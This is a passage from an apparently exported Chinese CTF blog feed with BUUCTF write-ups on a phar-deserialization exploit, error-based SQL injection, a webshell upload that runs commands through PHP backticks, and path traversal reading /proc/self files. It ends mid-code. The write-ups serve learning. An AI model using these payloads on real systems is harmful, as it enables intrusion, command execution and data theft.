title="phar"></a>phar</h4><p>流包装一种，大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。</p><p>phar扩展识别phar文件的标志：必须以<code>__HALT_COMPILER();?&gt;</code>来结尾</p><p>phar本质是压缩文件，将文件的信息压缩在一起，而对用户自定义的meta-data部分会进行序列化储存。有序列化就有反序列化。php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化。这些函数包含file_put_contents,file_get_contents,fopen,unlink等</p><p><img src="C:\Users\wen\Documents\md_note\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>1、phar文件要能够上传到服务器端。<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</p><p>2、要有可用的魔术方法作为“跳板”。<br>3、文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤</p><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>大概就是class.php里面的File类有close(),<code>return file_get_contents($this-&gt;filename);</code>,我们让filename&#x3D;&#x2F;flag.txt,然后用user类destruct默认调用close方法。但是没有回显。</p><p>function __all($func, $args)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __call($func, $args) &#123;</span><br><span class="line">array_push($this-&gt;funcs, $func);#将func函数存到$this-&gt;funcs数组</span><br><span class="line">foreach ($this-&gt;files as $file) &#123; #file就是每个我们上传文件的File对象， $this-&gt;files是一个数组，construct时候已经存入了我们的file对象。</span><br><span class="line">$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();#二维数组，一维键名是文件名，二维键名是函数名，存储函数执行的结果。</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function __destruct()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= &#x27;&lt;tr&gt;&#x27;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">                $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;;</span><br><span class="line">            $table .= &#x27;&lt;/tr&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>foreach ($this-&gt;results as $filename &#x3D;&gt; $result) 每次把每个一级数组的值，传递给$result,即filename1[]</p><p>foreach ($result as $func &#x3D;&gt; $value) 每次把每个二级数组的值，传递给$value</p><p>echo table 最后打印出来全部数据</p></blockquote><p>就是说call方法遍历我们上传的文件，存入二维数组result中。</p><p>然后destruct方法则是输出打印二维数组result中的信息。</p><p>那么我们就可以将我们要读取的flag.txt的函数存入二维数组。利用call方法，即访问不存在的函数。</p><p>所以综上：File类有close(),<code>return file_get_contents($this-&gt;filename);</code>,我们让filename&#x3D;&#x2F;flag.txt,让user类的$this-&gt;db &#x3D; new FileList()，则会调用不存在的close，触发__call()将内容写入二维数组，最后destruct输出内容。</p><p>那如何将内容写入二维数组呢。用FileList的construct函数，自己写进去。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"><span class="comment">//几个类还有成员变量照抄。phar部分是固定格式（基本一样），重写construct，其他的题目PHP文件有</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="comment">//private $results;</span></span><br><span class="line">    <span class="comment">//private $funcs;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="comment">//$this-&gt;results = array();</span></span><br><span class="line">        <span class="comment">//$this-&gt;funcs = array();</span></span><br><span class="line">        <span class="comment">#重写construct函数，初始化变量，注意得是数组。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;van.phar&quot;</span>);<span class="comment">#删除van.phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;van.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">#提高性能，好像不必要</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后会生成一个文件，将文件上传然后抓包修改后缀为jpg，再点删除用burp拦截，改filename&#x3D;phar:&#x2F;&#x2F;phar.jpg，就可以得到flag</p><p>注意 ：将php.ini文件中的phar.readonly 必须设置为 0 ，记得把前面的注释符 ; 去掉。</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>为什么没回显 因为只是return而没有输出出来</p><p>为什么要点删除才触发</p><p>因为在因为delete.php有detele()对应File对象的detele()，unlink可以触发phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且download.php中的ini_set<code>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”);</code>这个函数执行后，我们通过Web只能访问当前目录、&#x2F;etc和&#x2F;tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。</p><p>猜测flag的名字</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/5b91e0b7f3ac">https://www.jianshu.com/p/5b91e0b7f3ac</a></p><p><a href="https://blog.csdn.net/weixin_45642610/article/details/118559247">https://blog.csdn.net/weixin_45642610/article/details/118559247</a></p><p><a href="https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">https://blog.csdn.net/weixin_44077544/article/details/102844554</a></p><p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[RCTF2015]EasySQL</title>
      <link href="/2023/02/11/RCTF2015-EasySQL/"/>
      <url>/2023/02/11/RCTF2015-EasySQL/</url>
      
        <content type="html"><![CDATA[<p>题目</p><p>打开是有注册和登录的字样。先随便注册，再登录。</p><p>发现三个中二的文段。同时url栏有?title&#x3D;xxx</p><p>点击用户名，发现可以更改密码。那应该是有一个update语句。</p><p>这种可能存在注入的是用户名和密码，所以回到注册去试一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">注册用户名 <span class="number">1</span><span class="string">&#x27; &quot; 回到改密码的地方，发现报错</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near &#x27;</span>&quot;1&#x27;&quot;&quot; and pwd=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;&#x27; at line 1</span><br><span class="line">猜测语句是select * from users where uname=&quot;&quot; and pwd=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">双引号闭合。报错注入。过滤空格，括号绕过。</span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span>(database()))),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~web_sqli&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#&amp;password=123&amp;email=123</span><br><span class="line">XPATH syntax error: &#x27;~article,flag,users&#x27;</span><br><span class="line"></span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>))),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~flag&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(flag)from(flag))),1))#&amp;password=123&amp;email=123</span><br><span class="line">XPATH syntax error: &#x27;~RCTF&#123;Good job! But flag not her&#x27;</span><br><span class="line"></span><br><span class="line">继续查其他表。</span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;,pwd,email,real_flag_1s_here&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,(select(real_flag_1s_here)from(users)),1))#&amp;password=123&amp;email=123</span><br><span class="line">Subquery returns more than 1 row</span><br><span class="line">由于有多个列，所以回显不出来。用正则匹配</span><br><span class="line"></span><br><span class="line">username=1&quot;<span class="operator">||</span>(updatexml(<span class="number">1</span>,(<span class="keyword">select</span>(real_flag_1s_here)<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>)),<span class="number">1</span>))#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>email<span class="operator">=</span><span class="number">123</span></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;&#123;b89b2233-e011-429a-902c-08568c7&#x27;</span></span><br><span class="line"></span><br><span class="line">updatexml()函数有长度限制（<span class="number">32</span>位），使用reverse()进行倒序输出</span><br><span class="line">username<span class="operator">=</span><span class="number">1</span>&quot;||(updatexml(1,concat(&#x27;~&#x27;,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#&amp;password=123&amp;email=123</span><br><span class="line">XPATH syntax error: &#x27;~&#125;c3f6f7c86580-c209-a924-110e-33&#x27;</span><br><span class="line"></span><br><span class="line">python</span><br><span class="line">&gt;&gt;&gt; s=&quot;&#125;c3f6f7c86580<span class="operator">-</span>c209<span class="operator">-</span>a924<span class="number">-110e-33</span>&quot;</span><br><span class="line">&gt;&gt;&gt; s=s[::-1]</span><br><span class="line">&gt;&gt;&gt; print(s)</span><br><span class="line">33-e011-429a-902c-08568c7f6f3c&#125;</span><br><span class="line">flag&#123;b89b2233-e011-429a-902c-08568c7f6f3c&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/RABCDXB/article/details/122491459">https://blog.csdn.net/RABCDXB/article/details/122491459</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105179021">https://blog.csdn.net/mochu7777777/article/details/105179021</a></p><p><a href="https://blog.csdn.net/weixin_48335916/article/details/112339923">https://blog.csdn.net/weixin_48335916/article/details/112339923</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> sql </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[红明谷CTF 2021]write_shell</title>
      <link href="/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/"/>
      <url>/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/</url>
      
        <content type="html"><![CDATA[<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>关键是利用file_put_contents查看输出结果，通过$dir得出路径</p><p>?action&#x3D;pwd  –&gt;  sandbox&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;</p><p>接下来写命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;script&gt;alert(&quot;whoami&quot;)&lt;/script&gt;</span><br><span class="line">访问http://0bdbbb92-4d08-46b8-a2ff-c089a0bc56ff.node4.buuoj.cn:81/sandbox/c47b21fcf8f0bc8b3920541abd8024fd/ 成功弹窗</span><br><span class="line"></span><br><span class="line">由于写入的文件是后缀名为php的，所以要能够执行语句，语法就得满足php。过滤了PHP，可以使用php的短标签。</span><br><span class="line"></span><br><span class="line">尝试了一下&lt;?= ?&gt;可以成功写入，这个&lt;?= ?&gt;相当于&lt;?echo ?&gt;,空格杯过滤了用%09代替,或者\t</span><br><span class="line"></span><br><span class="line">执行命令：PHP执行运算符：反引号（``）。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符&quot;`&quot;的效果与函数shell_exec() 相同。</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">关闭了 shell_exec() 时反引号运算符是无效的。</span><br><span class="line">与其它某些语言不同，反引号不能在双引号字符串中使用。</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">?action=upload&amp;data=&lt;?=`ls%09/`?&gt;</span><br><span class="line">?action=upload&amp;data=&lt;?=`cat%09/f*`?&gt;</span><br><span class="line"></span><br><span class="line">a?b:c 三目运算符</span><br><span class="line">a?:b a为真返回 否则返回b</span><br><span class="line">a??b a存在(不为null)返回a，否则返回b</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/cjdgg/article/details/118216890">https://blog.csdn.net/cjdgg/article/details/118216890</a></p><p><a href="https://www.cnblogs.com/aninock/p/15221334.html">https://www.cnblogs.com/aninock/p/15221334.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 白虎组]PicDown</title>
      <link href="/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
      <url>/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&#x3D;</p><p>一般这种就是路径遍历，ssrf，或者文件包含，PHP伪协议php:&#x2F;&#x2F;filter,file:&#x2F;&#x2F;,或者?file&#x3D;<a href="http://127.0.0.1/admin.php%E7%AD%89%E7%AD%89">http://127.0.0.1/admin.php等等</a></p><p>试一下路径遍历，发现下载了几个文件，不过仔细看大小不同。用记事本打开，知道与自己的遍历的内容有关。题目可以直接..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag找到 据说是平台环境问题，正式比赛flag不在这里。</p><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230210210219477.png" alt="image-20230210210219477"></p><p>用抓包的话，不会下载文件，而是直接可以看出内容</p><h4 id="正规解法"><a href="#正规解法" class="headerlink" title="正规解法"></a>正规解法</h4><blockquote><p>我们都知道可以通过&#x2F;proc&#x2F;$pid&#x2F;来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问&#x2F;proc&#x2F;$pid&#x2F;目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的系统信息，而不用每次都获取pid</p></blockquote><p>即proc&#x2F;具体pid&#x2F;目录和proc&#x2F;self&#x2F;目录 基本等价</p><blockquote><p>fd是一个目录，里面包含着<strong>当前进程打开的每一个文件</strong>的描述符（file descriptor）差不多就是<strong>路径</strong>啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过<strong>fd</strong>目录的文件获取进程，从而打开每个文件的路径以及文件内容。</p><p>这个fd比较重要，因为在Linux系统中，如果一个程序用 open() 打开了一个文件，但是最终没有关闭它，即使从外部（如：os.remove(SECRET_FILE))删除这个文件之后，在&#x2F;proc这个进程的 pid目录下的fd文件描述符 目录下 还是会有这个文件的文件描述符，通过这个文件描述符我们即可以得到被删除的文件的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">读取</span><br><span class="line">/proc/self/environ   当前环境</span><br><span class="line">/proc/self/cmdline 启动当前进程的完整命令---发现有app.py</span><br><span class="line">/proc/self/fd/文件描述符   查看当前进程打开的文件内容   </span><br><span class="line"></span><br><span class="line">读取app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 